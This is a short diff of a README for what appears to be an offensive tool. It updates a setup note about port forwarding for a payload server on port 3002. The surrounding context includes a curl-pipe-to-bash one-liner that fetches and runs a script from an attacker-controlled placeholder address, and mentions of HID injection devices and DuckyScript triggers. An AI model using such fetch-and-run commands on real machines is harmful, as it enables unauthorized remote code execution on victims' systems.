@@ -183,7 +183,7 @@ bash -c "$(curl -fsSL http://<ipaddress>:3002/<scriptName.sh>)"
 Other wise you can use an HID injection device and uses one of the trigger scripts I have provided:
 
 > [!NOTE]
-> Make sure to run setup.py to update the server Ip address, as well as choosing a script name.
+> Make sure to run setup.py to update the server Ip address, as well as choosing a script name and setting port forwarding for port 3002.
 
 ### DuckyScript 
 
